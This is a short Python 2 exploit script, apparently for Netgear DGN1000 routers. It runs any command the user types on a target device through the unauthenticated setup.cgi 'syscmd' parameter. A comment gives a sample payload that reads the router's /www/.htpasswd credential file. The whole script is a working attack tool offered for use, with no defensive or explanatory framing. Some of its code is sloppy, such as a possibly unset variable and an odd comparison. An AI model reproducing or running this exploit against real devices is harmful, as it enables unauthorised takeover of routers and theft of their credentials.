import requests
import sys
#DGN1000_COMAND_EXECUTE.py http://xx.xx.xx.ss
#cat%20/www/.htpasswd

def COMMANDEXECUTE(url,a):
	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
	uri = "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=" + a + "&curpath=/&currentsetting.htm"
	url = url + uri
	try:
		res = requests.get(url, headers=header, verify=False, timeout=8)
		data = res.content
	except Exception as e:
		pass
	if data > -1:
		print data
	else:
		return None

		
if __name__ == "__main__":
	if(sys.argv[1]):
		print "--------------------\nINPUT YOUR COMMAND:|\n--------------------"
		a = raw_input()
		COMMANDEXECUTE(sys.argv[1],a)
	else:
		print 'please add command param'




























